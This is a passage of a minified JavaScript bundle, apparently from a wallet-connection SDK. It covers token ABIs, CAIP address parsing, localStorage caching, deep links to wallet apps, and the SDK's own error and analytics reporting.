0?0:parseFloat(r.replace(/,/gu,""))}},NXe=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],PXe=[{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}],$Xe=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],RXe={getERC20Abi:r=>Ht.USDT_CONTRACT_ADDRESSES.includes(r)?$Xe:NXe,getSwapAbi:()=>PXe},uf={validateCaipAddress(r){if(r.split(":")?.length!==3)throw new Error("Invalid CAIP Address");return r},parseCaipAddress(r){const e=r.split(":");if(e.length!==3)throw new Error(`Invalid CAIP-10 address: ${r}`);const[t,i,n]=e;if(!t||!i||!n)throw new Error(`Invalid CAIP-10 address: ${r}`);return{chainNamespace:t,chainId:i,address:n}},parseCaipNetworkId(r){const e=r.split(":");if(e.length!==2)throw new Error(`Invalid CAIP-2 network id: ${r}`);const[t,i]=e;if(!t||!i)throw new Error(`Invalid CAIP-2 network id: ${r}`);return{chainNamespace:t,chainId:i}}},Cr={WALLET_ID:"@appkit/wallet_id",WALLET_NAME:"@appkit/wallet_name",SOLANA_WALLET:"@appkit/solana_wallet",SOLANA_CAIP_CHAIN:"@appkit/solana_caip_chain",ACTIVE_CAIP_NETWORK_ID:"@appkit/active_caip_network_id",CONNECTED_SOCIAL:"@appkit/connected_social",CONNECTED_SOCIAL_USERNAME:"@appkit-wallet/SOCIAL_USERNAME",RECENT_WALLETS:"@appkit/recent_wallets",DEEPLINK_CHOICE:"WALLETCONNECT_DEEPLINK_CHOICE",ACTIVE_NAMESPACE:"@appkit/active_namespace",CONNECTED_NAMESPACES:"@appkit/connected_namespaces",CONNECTION_STATUS:"@appkit/connection_status",SIWX_AUTH_TOKEN:"@appkit/siwx-auth-token",SIWX_NONCE_TOKEN:"@appkit/siwx-nonce-token",TELEGRAM_SOCIAL_PROVIDER:"@appkit/social_provider",NATIVE_BALANCE_CACHE:"@appkit/native_balance_cache",PORTFOLIO_CACHE:"@appkit/portfolio_cache",ENS_CACHE:"@appkit/ens_cache",IDENTITY_CACHE:"@appkit/identity_cache",PREFERRED_ACCOUNT_TYPES:"@appkit/preferred_account_types",CONNECTIONS:"@appkit/connections"};function tT(r){if(!r)throw new Error("Namespace is required for CONNECTED_CONNECTOR_ID");return`@appkit/${r}:connected_connector_id`}const br={setItem(r,e){u5()&&e!==void 0&&localStorage.setItem(r,e)},getItem(r){if(u5())return localStorage.getItem(r)||void 0},removeItem(r){u5()&&localStorage.removeItem(r)},clear(){u5()&&localStorage.clear()}};function u5(){return typeof window<"u"&&typeof localStorage<"u"}function Lf(r,e){return e==="light"?{"--w3m-accent":r?.["--w3m-accent"]||"hsla(231, 100%, 70%, 1)","--w3m-background":"#fff"}:{"--w3m-accent":r?.["--w3m-accent"]||"hsla(230, 100%, 67%, 1)","--w3m-background":"#121313"}}const cse=[{label:"Coinbase",name:"coinbase",feeRange:"1-2%",url:"",supportedChains:["eip155"]},{label:"Meld.io",name:"meld",feeRange:"1-2%",url:"https://meldcrypto.com",supportedChains:["eip155","solana"]}],OXe="WXETMuFUQmqqybHuRkSgxv:25B8LJHSfpG6LVjR2ytU5Cwh7Z4Sch2ocoU",Di={FOUR_MINUTES_MS:24e4,TEN_SEC_MS:1e4,ONE_SEC_MS:1e3,BALANCE_SUPPORTED_CHAINS:["eip155","solana"],NAMES_SUPPORTED_CHAIN_NAMESPACES:["eip155"],NATIVE_TOKEN_ADDRESS:{eip155:"0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",solana:"So11111111111111111111111111111111111111111",polkadot:"0x",bip122:"0x",cosmos:"0x"},CONVERT_SLIPPAGE_TOLERANCE:1,CONNECT_LABELS:{MOBILE:"Open and continue in the wallet app"},SEND_SUPPORTED_NAMESPACES:["eip155","solana"],DEFAULT_REMOTE_FEATURES:{swaps:["1inch"],onramp:["coinbase","meld"],email:!0,socials:["google","x","discord","farcaster","github","apple","facebook"],activity:!0,reownBranding:!0},DEFAULT_REMOTE_FEATURES_DISABLED:{email:!1,socials:!1,swaps:!1,onramp:!1,activity:!1,reownBranding:!1},DEFAULT_FEATURES:{receive:!0,send:!0,emailShowWallets:!0,connectorTypeOrder:["walletConnect","recent","injected","featured","custom","external","recommended"],analytics:!0,allWallets:!0,legalCheckbox:!1,smartSessions:!1,collapseWallets:!1,walletFeaturesOrder:["onramp","swaps","receive","send"],connectMethodsOrder:void 0,pay:!1},DEFAULT_ACCOUNT_TYPES:{bip122:"payment",eip155:"smartAccount",polkadot:"eoa",solana:"eoa"},ADAPTER_TYPES:{UNIVERSAL:"universal"}},Bt={cacheExpiry:{portfolio:3e4,nativeBalance:3e4,ens:3e5,identity:3e5},isCacheExpired(r,e){return Date.now()-r>e},getActiveNetworkProps(){const r=Bt.getActiveNamespace(),e=Bt.getActiveCaipNetworkId(),t=e?e.split(":")[1]:void 0,i=t?isNaN(Number(t))?t:Number(t):void 0;return{namespace:r,caipNetworkId:e,chainId:i}},setWalletConnectDeepLink({name:r,href:e}){try{br.setItem(Cr.DEEPLINK_CHOICE,JSON.stringify({href:e,name:r}))}catch{console.info("Unable to set WalletConnect deep link")}},getWalletConnectDeepLink(){try{const r=br.getItem(Cr.DEEPLINK_CHOICE);if(r)return JSON.parse(r)}catch{console.info("Unable to get WalletConnect deep link")}},deleteWalletConnectDeepLink(){try{br.removeItem(Cr.DEEPLINK_CHOICE)}catch{console.info("Unable to delete WalletConnect deep link")}},setActiveNamespace(r){try{br.setItem(Cr.ACTIVE_NAMESPACE,r)}catch{console.info("Unable to set active namespace")}},setActiveCaipNetworkId(r){try{br.setItem(Cr.ACTIVE_CAIP_NETWORK_ID,r),Bt.setActiveNamespace(r.split(":")[0])}catch{console.info("Unable to set active caip network id")}},getActiveCaipNetworkId(){try{return br.getItem(Cr.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to get active caip network id");return}},deleteActiveCaipNetworkId(){try{br.removeItem(Cr.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to delete active caip network id")}},deleteConnectedConnectorId(r){try{const e=tT(r);br.removeItem(e)}catch{console.info("Unable to delete connected connector id")}},setAppKitRecent(r){try{const e=Bt.getRecentWallets();e.find(i=>i.id===r.id)||(e.unshift(r),e.length>2&&e.pop(),br.setItem(Cr.RECENT_WALLETS,JSON.stringify(e)))}catch{console.info("Unable to set AppKit recent")}},getRecentWallets(){try{const r=br.getItem(Cr.RECENT_WALLETS);return r?JSON.parse(r):[]}catch{console.info("Unable to get AppKit recent")}return[]},setConnectedConnectorId(r,e){try{const t=tT(r);br.setItem(t,e)}catch{console.info("Unable to set Connected Connector Id")}},getActiveNamespace(){try{return br.getItem(Cr.ACTIVE_NAMESPACE)}catch{console.info("Unable to get active namespace")}},getConnectedConnectorId(r){if(r)try{const e=tT(r);return br.getItem(e)}catch{console.info("Unable to get connected connector id in namespace ",r)}},setConnectedSocialProvider(r){try{br.setItem(Cr.CONNECTED_SOCIAL,r)}catch{console.info("Unable to set connected social provider")}},getConnectedSocialProvider(){try{return br.getItem(Cr.CONNECTED_SOCIAL)}catch{console.info("Unable to get connected social provider")}},deleteConnectedSocialProvider(){try{br.removeItem(Cr.CONNECTED_SOCIAL)}catch{console.info("Unable to delete connected social provider")}},getConnectedSocialUsername(){try{return br.getItem(Cr.CONNECTED_SOCIAL_USERNAME)}catch{console.info("Unable to get connected social username")}},getStoredActiveCaipNetworkId(){return br.getItem(Cr.ACTIVE_CAIP_NETWORK_ID)?.split(":")?.[1]},setConnectionStatus(r){try{br.setItem(Cr.CONNECTION_STATUS,r)}catch{console.info("Unable to set connection status")}},getConnectionStatus(){try{return br.getItem(Cr.CONNECTION_STATUS)}catch{return}},getConnectedNamespaces(){try{const r=br.getItem(Cr.CONNECTED_NAMESPACES);return r?.length?r.split(","):[]}catch{return[]}},setConnectedNamespaces(r){try{const e=Array.from(new Set(r));br.setItem(Cr.CONNECTED_NAMESPACES,e.join(","))}catch{console.info("Unable to set namespaces in storage")}},addConnectedNamespace(r){try{const e=Bt.getConnectedNamespaces();e.includes(r)||(e.push(r),Bt.setConnectedNamespaces(e))}catch{console.info("Unable to add connected namespace")}},removeConnectedNamespace(r){try{const e=Bt.getConnectedNamespaces(),t=e.indexOf(r);t>-1&&(e.splice(t,1),Bt.setConnectedNamespaces(e))}catch{console.info("Unable to remove connected namespace")}},getTelegramSocialProvider(){try{return br.getItem(Cr.TELEGRAM_SOCIAL_PROVIDER)}catch{return console.info("Unable to get telegram social provider"),null}},setTelegramSocialProvider(r){try{br.setItem(Cr.TELEGRAM_SOCIAL_PROVIDER,r)}catch{console.info("Unable to set telegram social provider")}},removeTelegramSocialProvider(){try{br.removeItem(Cr.TELEGRAM_SOCIAL_PROVIDER)}catch{console.info("Unable to remove telegram social provider")}},getBalanceCache(){let r={};try{const e=br.getItem(Cr.PORTFOLIO_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return r},removeAddressFromBalanceCache(r){try{const e=Bt.getBalanceCache();br.setItem(Cr.PORTFOLIO_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove address from balance cache",r)}},getBalanceCacheForCaipAddress(r){try{const t=Bt.getBalanceCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.portfolio))return t.balance;Bt.removeAddressFromBalanceCache(r)}catch{console.info("Unable to get balance cache for address",r)}},updateBalanceCache(r){try{const e=Bt.getBalanceCache();e[r.caipAddress]=r,br.setItem(Cr.PORTFOLIO_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",r)}},getNativeBalanceCache(){let r={};try{const e=br.getItem(Cr.NATIVE_BALANCE_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return r},removeAddressFromNativeBalanceCache(r){try{const e=Bt.getBalanceCache();br.setItem(Cr.NATIVE_BALANCE_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove address from balance cache",r)}},getNativeBalanceCacheForCaipAddress(r){try{const t=Bt.getNativeBalanceCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.nativeBalance))return t;console.info("Discarding cache for address",r),Bt.removeAddressFromBalanceCache(r)}catch{console.info("Unable to get balance cache for address",r)}},updateNativeBalanceCache(r){try{const e=Bt.getNativeBalanceCache();e[r.caipAddress]=r,br.setItem(Cr.NATIVE_BALANCE_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",r)}},getEnsCache(){let r={};try{const e=br.getItem(Cr.ENS_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get ens name cache")}return r},getEnsFromCacheForAddress(r){try{const t=Bt.getEnsCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.ens))return t.ens;Bt.removeEnsFromCache(r)}catch{console.info("Unable to get ens name from cache",r)}},updateEnsCache(r){try{const e=Bt.getEnsCache();e[r.address]=r,br.setItem(Cr.ENS_CACHE,JSON.stringify(e))}catch{console.info("Unable to update ens name cache",r)}},removeEnsFromCache(r){try{const e=Bt.getEnsCache();br.setItem(Cr.ENS_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove ens name from cache",r)}},getIdentityCache(){let r={};try{const e=br.getItem(Cr.IDENTITY_CACHE);r=e?JSON.parse(e):{}}catch{console.info("Unable to get identity cache")}return r},getIdentityFromCacheForAddress(r){try{const t=Bt.getIdentityCache()[r];if(t&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.identity))return t.identity;Bt.removeIdentityFromCache(r)}catch{console.info("Unable to get identity from cache",r)}},updateIdentityCache(r){try{const e=Bt.getIdentityCache();e[r.address]={identity:r.identity,timestamp:r.timestamp},br.setItem(Cr.IDENTITY_CACHE,JSON.stringify(e))}catch{console.info("Unable to update identity cache",r)}},removeIdentityFromCache(r){try{const e=Bt.getIdentityCache();br.setItem(Cr.IDENTITY_CACHE,JSON.stringify({...e,[r]:void 0}))}catch{console.info("Unable to remove identity from cache",r)}},clearAddressCache(){try{br.removeItem(Cr.PORTFOLIO_CACHE),br.removeItem(Cr.NATIVE_BALANCE_CACHE),br.removeItem(Cr.ENS_CACHE),br.removeItem(Cr.IDENTITY_CACHE)}catch{console.info("Unable to clear address cache")}},setPreferredAccountTypes(r){try{br.setItem(Cr.PREFERRED_ACCOUNT_TYPES,JSON.stringify(r))}catch{console.info("Unable to set preferred account types",r)}},getPreferredAccountTypes(){try{const r=br.getItem(Cr.PREFERRED_ACCOUNT_TYPES);return r?JSON.parse(r):{}}catch{console.info("Unable to get preferred account types")}return{}},setConnections(r,e){try{const t={...Bt.getConnections(),[e]:r};br.setItem(Cr.CONNECTIONS,JSON.stringify(t))}catch(t){console.error("Unable to sync connections to storage",t)}},getConnections(){try{const r=br.getItem(Cr.CONNECTIONS);return r?JSON.parse(r):{}}catch(r){return console.error("Unable to get connections from storage",r),{}}}},Ze={isMobile(){return this.isClient()?!!(typeof window?.matchMedia=="function"&&window?.matchMedia("(pointer:coarse)")?.matches||/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)):!1},checkCaipNetwork(r,e=""){return r?.caipNetworkId.toLocaleLowerCase().includes(e.toLowerCase())},isAndroid(){if(!this.isMobile())return!1;const r=window?.navigator.userAgent.toLowerCase();return Ze.isMobile()&&r.includes("android")},isIos(){if(!this.isMobile())return!1;const r=window?.navigator.userAgent.toLowerCase();return r.includes("iphone")||r.includes("ipad")},isSafari(){return this.isClient()?(window?.navigator.userAgent.toLowerCase()).includes("safari"):!1},isClient(){return typeof window<"u"},isPairingExpired(r){return r?r-Date.now()<=Di.TEN_SEC_MS:!0},isAllowedRetry(r,e=Di.ONE_SEC_MS){return Date.now()-r>=e},copyToClopboard(r){navigator.clipboard.writeText(r)},isIframe(){try{return window?.self!==window?.top}catch{return!1}},isSafeApp(){if(Ze.isClient()&&window.self!==window.top)try{const r=window?.location?.ancestorOrigins?.[0],e="https://app.safe.global";if(r){const t=new URL(r),i=new URL(e);return t.hostname===i.hostname}}catch{return!1}return!1},getPairingExpiry(){return Date.now()+Di.FOUR_MINUTES_MS},getNetworkId(r){return r?.split(":")[1]},getPlainAddress(r){return r?.split(":")[2]},async wait(r){return new Promise(e=>{setTimeout(e,r)})},debounce(r,e=500){let t;return(...i)=>{function n(){r(...i)}t&&clearTimeout(t),t=setTimeout(n,e)}},isHttpUrl(r){return r.startsWith("http://")||r.startsWith("https://")},formatNativeUrl(r,e,t=null){if(Ze.isHttpUrl(r))return this.formatUniversalUrl(r,e);let i=r,n=t;i.includes("://")||(i=r.replaceAll("/","").replaceAll(":",""),i=`${i}://`),i.endsWith("/")||(i=`${i}/`),n&&!n?.endsWith("/")&&(n=`${n}/`),this.isTelegram()&&this.isAndroid()&&(e=encodeURIComponent(e));const s=encodeURIComponent(e);return{redirect:`${i}wc?uri=${s}`,redirectUniversalLink:n?`${n}wc?uri=${s}`:void 0,href:i}},formatUniversalUrl(r,e){if(!Ze.isHttpUrl(r))return this.formatNativeUrl(r,e);let t=r;t.endsWith("/")||(t=`${t}/`);const i=encodeURIComponent(e);return{redirect:`${t}wc?uri=${i}`,href:t}},getOpenTargetForPlatform(r){return r==="popupWindow"?r:this.isTelegram()?Bt.getTelegramSocialProvider()?"_top":"_blank":r},openHref(r,e,t){window?.open(r,this.getOpenTargetForPlatform(e),t||"noreferrer noopener")},returnOpenHref(r,e,t){return window?.open(r,this.getOpenTargetForPlatform(e),t||"noreferrer noopener")},isTelegram(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)},isPWA(){if(typeof window>"u")return!1;const r=window.matchMedia?.("(display-mode: standalone)")?.matches,e=window?.navigator?.standalone;return!!(r||e)},async preloadImage(r){const e=new Promise((t,i)=>{const n=new Image;n.onload=t,n.onerror=i,n.crossOrigin="anonymous",n.src=r});return Promise.race([e,Ze.wait(2e3)])},formatBalance(r,e){let t="0.000";if(typeof r=="string"){const i=Number(r);if(i){const n=Math.floor(i*1e3)/1e3;n&&(t=n.toString())}}return`${t}${e?` ${e}`:""}`},formatBalance2(r,e){let t;if(r==="0")t="0";else if(typeof r=="string"){const i=Number(r);i&&(t=i.toString().match(/^-?\d+(?:\.\d{0,3})?/u)?.[0])}return{value:t??"0",rest:t==="0"?"000":"",symbol:e}},getApiUrl(){return Ht.W3M_API_URL},getBlockchainApiUrl(){return Ht.BLOCKCHAIN_API_RPC_URL},getAnalyticsUrl(){return Ht.PULSE_API_URL},getUUID(){return crypto?.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,r=>{const e=Math.random()*16|0;return(r==="x"?e:e&3|8).toString(16)})},parseError(r){return typeof r=="string"?r:typeof r?.issues?.[0]?.message=="string"?r.issues[0].message:r instanceof Error?r.message:"Unknown error"},sortRequestedNetworks(r,e=[]){const t={};return e&&r&&(r.forEach((i,n)=>{t[i]=n}),e.sort((i,n)=>{const s=t[i.id],o=t[n.id];return s!==void 0&&o!==void 0?s-o:s!==void 0?-1:o!==void 0?1:0})),e},calculateBalance(r){let e=0;for(const t of r)e+=t.value??0;return e},formatTokenBalance(r){const e=r.toFixed(2),[t,i]=e.split(".");return{dollars:t,pennies:i}},isAddress(r,e="eip155"){switch(e){case"eip155":if(/^(?:0x)?[0-9a-f]{40}$/iu.test(r)){if(/^(?:0x)?[0-9a-f]{40}$/iu.test(r)||/^(?:0x)?[0-9A-F]{40}$/iu.test(r))return!0}else return!1;return!1;case"solana":return/[1-9A-HJ-NP-Za-km-z]{32,44}$/iu.test(r);default:return!1}},uniqueBy(r,e){const t=new Set;return r.filter(i=>{const n=i[e];return t.has(n)?!1:(t.add(n),!0)})},generateSdkVersion(r,e,t){const n=r.length===0?Di.ADAPTER_TYPES.UNIVERSAL:r.map(s=>s.adapterType).join(",");return`${e}-${n}-${t}`},createAccount(r,e,t,i,n){return{namespace:r,address:e,type:t,publicKey:i,path:n}},isCaipAddress(r){if(typeof r!="string")return!1;const e=r.split(":"),t=e[0];return e.filter(Boolean).length===3&&t in Ht.CHAIN_NAME_MAP},isMac(){const r=window?.navigator.userAgent.toLowerCase();return r.includes("macintosh")&&!r.includes("safari")},formatTelegramSocialLoginUrl(r){const e=`--${encodeURIComponent(window?.location.href)}`,t="state=";if(new URL(r).host==="auth.magic.link"){const n="provider_authorization_url=",s=r.substring(r.indexOf(n)+n.length),o=this.injectIntoUrl(decodeURIComponent(s),t,e);return r.replace(s,encodeURIComponent(o))}return this.injectIntoUrl(r,t,e)},injectIntoUrl(r,e,t){const i=r.indexOf(e);if(i===-1)throw new Error(`${e} parameter not found in the URL: ${r}`);const n=r.indexOf("&",i),s=e.length,o=n!==-1?n:r.length,a=r.substring(0,i+s),c=r.substring(i+s,o),l=r.substring(n),u=c+t;return a+u+l}};async function qb(...r){const e=await fetch(...r);if(!e.ok)throw new Error(`HTTP status code: ${e.status}`,{cause:e});return e}class J4{constructor({baseUrl:e,clientId:t}){this.baseUrl=e,this.clientId=t}async get({headers:e,signal:t,cache:i,...n}){const s=this.createUrl(n);return(await qb(s,{method:"GET",headers:e,signal:t,cache:i})).json()}async getBlob({headers:e,signal:t,...i}){const n=this.createUrl(i);return(await qb(n,{method:"GET",headers:e,signal:t})).blob()}async post({body:e,headers:t,signal:i,...n}){const s=this.createUrl(n);return(await qb(s,{method:"POST",headers:t,body:e?JSON.stringify(e):void 0,signal:i})).json()}async put({body:e,headers:t,signal:i,...n}){const s=this.createUrl(n);return(await qb(s,{method:"PUT",headers:t,body:e?JSON.stringify(e):void 0,signal:i})).json()}async delete({body:e,headers:t,signal:i,...n}){const s=this.createUrl(n);return(await qb(s,{method:"DELETE",headers:t,body:e?JSON.stringify(e):void 0,signal:i})).json()}createUrl({path:e,params:t}){const i=new URL(e,this.baseUrl);return t&&Object.entries(t).forEach(([n,s])=>{s&&i.searchParams.append(n,s)}),this.clientId&&i.searchParams.append("clientId",this.clientId),i}}const BXe={getFeatureValue(r,e){const t=e?.[r];return t===void 0?Di.DEFAULT_FEATURES[r]:t},filterSocialsByPlatform(r){if(!r||!r.length)return r;if(Ze.isTelegram()){if(Ze.isIos())return r.filter(e=>e!=="google");if(Ze.isMac())return r.filter(e=>e!=="x");if(Ze.isAndroid())return r.filter(e=>!["facebook","x"].includes(e))}return r}},Qt=sr({features:Di.DEFAULT_FEATURES,projectId:"",sdkType:"appkit",sdkVersion:"html-wagmi-undefined",defaultAccountTypes:Di.DEFAULT_ACCOUNT_TYPES,enableNetworkSwitch:!0,experimental_preferUniversalLinks:!1,remoteFeatures:{}}),Be={state:Qt,subscribeKey(r,e){return ci(Qt,r,e)},setOptions(r){Object.assign(Qt,r)},setRemoteFeatures(r){if(!r)return;const e={...Qt.remoteFeatures,...r};Qt.remoteFeatures=e,Qt.remoteFeatures?.socials&&(Qt.remoteFeatures.socials=BXe.filterSocialsByPlatform(Qt.remoteFeatures.socials))},setFeatures(r){if(!r)return;Qt.features||(Qt.features=Di.DEFAULT_FEATURES);const e={...Qt.features,...r};Qt.features=e},setProjectId(r){Qt.projectId=r},setCustomRpcUrls(r){Qt.customRpcUrls=r},setAllWallets(r){Qt.allWallets=r},setIncludeWalletIds(r){Qt.includeWalletIds=r},setExcludeWalletIds(r){Qt.excludeWalletIds=r},setFeaturedWalletIds(r){Qt.featuredWalletIds=r},setTokens(r){Qt.tokens=r},setTermsConditionsUrl(r){Qt.termsConditionsUrl=r},setPrivacyPolicyUrl(r){Qt.privacyPolicyUrl=r},setCustomWallets(r){Qt.customWallets=r},setIsSiweEnabled(r){Qt.isSiweEnabled=r},setIsUniversalProvider(r){Qt.isUniversalProvider=r},setSdkVersion(r){Qt.sdkVersion=r},setMetadata(r){Qt.metadata=r},setDisableAppend(r){Qt.disableAppend=r},setEIP6963Enabled(r){Qt.enableEIP6963=r},setDebug(r){Qt.debug=r},setEnableWalletConnect(r){Qt.enableWalletConnect=r},setEnableWalletGuide(r){Qt.enableWalletGuide=r},setEnableAuthLogger(r){Qt.enableAuthLogger=r},setEnableWallets(r){Qt.enableWallets=r},setPreferUniversalLinks(r){Qt.experimental_preferUniversalLinks=r},setHasMultipleAddresses(r){Qt.hasMultipleAddresses=r},setSIWX(r){Qt.siwx=r},setConnectMethodsOrder(r){Qt.features={...Qt.features,connectMethodsOrder:r}},setWalletFeaturesOrder(r){Qt.features={...Qt.features,walletFeaturesOrder:r}},setSocialsOrder(r){Qt.remoteFeatures={...Qt.remoteFeatures,socials:r}},setCollapseWallets(r){Qt.features={...Qt.features,collapseWallets:r}},setEnableEmbedded(r){Qt.enableEmbedded=r},setAllowUnsupportedChain(r){Qt.allowUnsupportedChain=r},setManualWCControl(r){Qt.manualWCControl=r},setEnableNetworkSwitch(r){Qt.enableNetworkSwitch=r},setDefaultAccountTypes(r={}){Object.entries(r).forEach(([e,t])=>{t&&(Qt.defaultAccountTypes[e]=t)})},setUniversalProviderConfigOverride(r){Qt.universalProviderConfigOverride=r},getUniversalProviderConfigOverride(){return Qt.universalProviderConfigOverride},getSnapshot(){return kd(Qt)}},MXe=Object.freeze({enabled:!0,events:[]}),DXe=new J4({baseUrl:Ze.getAnalyticsUrl(),clientId:null}),LXe=5,UXe=60*1e3,df=sr({...MXe}),jXe={state:df,subscribeKey(r,e){return ci(df,r,e)},async sendError(r,e){if(!df.enabled)return;const t=Date.now();if(df.events.filter(s=>{const o=new Date(s.properties.timestamp||"").getTime();return t-o<UXe}).length>=LXe)return;const n={type:"error",event:e,properties:{errorType:r.name,errorMessage:r.message,stackTrace:r.stack,timestamp:new Date().toISOString()}};df.events.push(n);try{if(typeof window>"u")return;const{projectId:s,sdkType:o,sdkVersion:a}=Be.state;await DXe.post({path:"/e",params:{projectId:s,st:o,sv:a||"html-wagmi-4.2.2"},body:{eventId:Ze.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:new Date().toISOString(),props:{type:"error",event:e,errorType:r.name,errorMessage:r.message,stackTrace:r.stack}}})}catch{}},enable(){df.enabled=!0},disable(){df.enabled=!1},clearEvents(){df.events=[]}};class Xw extends Error{constructor(e,t,i){super(e),this.name="AppKitError",this.category=t,this.originalError=i,Object.setPrototypeOf(this,Xw.prototype);let n=!1;if(i instanceof Error&&typeof i.stack=="string"&&i.stack){const s=i.stack,o=s.indexOf(`
`);if(o>-1){const a=s.substring(o+1);this.stack=`${this.name}: ${this.message}
${a}`,n=!0}}n||(Error.captureStackTrace?Error.captureStackTrace(this,Xw):this.stack||(this.stack=`${this.name}: ${this.message}`))}}function UV(r,e){const t=r instanceof Xw?r:new Xw(r instanceof Error?r.message:String(r),e,r);throw jXe.sendError(t,t.category),t}function qa(r,e="INTERNAL_SDK_ERROR"){const t={};return Object.keys(r).forEach(i=>{const n=r[i];if(typeof n=="function"){let s=n;n.constructor.name==="AsyncFunction"?s=async(...o)=>{try{return await n(...o)}catch(a){return UV(a,e)}}:s=(...o)=>{try{return n(...o)}catch(a){return UV(a,e)}},t[i]=s}else t[i]=n}),t}const cd={PHANTOM:{id:"a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393",url:"https://phantom.app"},SOLFLARE:{id:"1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79",url:"https://solflare.com"},COINBASE:{id:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",url:"https://go.cb-w.com"}},FXe={handleMobileDeeplinkRedirect(r,e){const t=window.location.href,i=encodeURIComponent(t);if(r===cd.PHANTOM.id&&!("phantom"in window)){const n=t.startsWith("https")?"https":"http",s=t.split("/")[2],o=encodeURIComponent(`${n}://${s}`);window.location.href=`${cd.PHANTOM.url}/ul/browse/${i}?ref=${o}`}r===cd.SOLFLARE.id&&!("solflare"in window)&&(window.location.href=`${cd.SOLFLARE.url}/ul/v1/browse/${i}?ref=${i}`),e===Ht.CHAIN.SOLANA&&r===cd.COINBASE.id&&!("coinbaseSolana"in window)&&(window.location.href=`${cd.COINBASE.url}/dapp?cb_url=${i}`)}},Ya=sr({walletImages:{},networkImages:{},chainImages:{},connectorImages:{},tokenImages:{},currencyImages:{}}),qXe={state:Ya,subscribeNetworkImages(r){return ai(Ya.networkImages,()=>r(Ya.networkImages))},subscribeKey(r,e){return ci(Ya,r,e)},subscribe(r){return ai(Ya,()=>r(Ya))},setWalletImage(r,e){Ya.walletImages[r]=e},setNetworkImage(r,e){Ya.networkImages[r]=e},setChainImage(r,e){Ya.chainImages[r]=e},setConnectorImage(r,e){Ya.connectorImages={...Ya.connectorImages,[r]:e}},setTokenImage(r,e){Ya.tokenImages[r]=e},setCurrencyImage(r,e){Ya.currencyImages[r]=e}},Ia=qa(qXe),zXe={eip155:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",solana:"a1b58899-f671-4276-6a5e-56ca5bd59700",polkadot:"",bip122:"0b4838db-0161-4ffe-022d-532bf03dba00",cosmos:""},rT=sr({networkImagePromises:{}}),Es={async fetchWalletImage(r){if(r)return await rt._fetchWalletImage(r),this.getWalletImageById(r)},async fetchNetworkImage(r){if(!r)return;const e=this.getNetworkImageById(r);return e||(rT.networkImagePromises[r]||(rT.networkImagePromises[r]=rt._fetchNetworkImage(r)),await rT.networkImagePromises[r],this.getNetworkImageById(r))},getWalletImageById(r){if(r)return Ia.state.walletImages[r]},getWalletImage(r){if(r?.image_url)return r?.image_url;if(r?.image_id)return Ia.state.walletImages[r.image_id]},getNetworkImage(r){if(r?.assets?.imageUrl)return r?.assets?.imageUrl;if(r?.assets?.imageId)return Ia.state.networkImages[r.assets.imageId]},getNetworkImageById(r){if(r)return Ia.state.networkImages[r]},getConnectorImage(r){if(r?.imageUrl)return r.imageUrl;if(r?.imageId)return Ia.state.connectorImages[r.imageId]},getChainImage(r){return Ia.state.networkImages[zXe[r]]}},hf=sr({message:"",variant:"info",open:!1}),WXe={state:hf,subscribeKey(r,e){return ci(hf,r,e)},open(r,e){const{debug:t}=Be.state,{shortMessage:i,longMessage:n}=r;t&&(hf.message=i,hf.variant=e,hf.open=!0),n&&console.error(typeof n=="function"?n():n)},close(){hf.open=!1,hf.message="",hf.variant="info"}},ou=qa(WXe),HXe=Ze.getAnalyticsUrl(),VXe=new J4({baseUrl:HXe,clientId:null}),KXe=["MODAL_CREATED"],Eh=sr({timestamp:Date.now(),reportedErrors:{},data:{type:"track",event:"MODAL_CREATED"}}),Hr={state:Eh,subscribe(r){return ai(Eh,()=>r(Eh))},getSdkProperties(){const{projectId:r,sdkType:e,sdkVersion:t}=Be.state;return{projectId:r,st:e,sv:t||"html-wagmi-4.2.2"}},async _sendAnalyticsEvent(r){try{const e=qt.state.address;if(KXe.includes(r.data.event)||typeof window>"u")return;await VXe.post({path:"/e",params:Hr.getSdkProperties(),body:{eventId:Ze.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:r.timestamp,props:{...r.data,address:e}}}),Eh.reportedErrors.FORBIDDEN=!1}catch(e){e instanceof Error&&e.cause instanceof 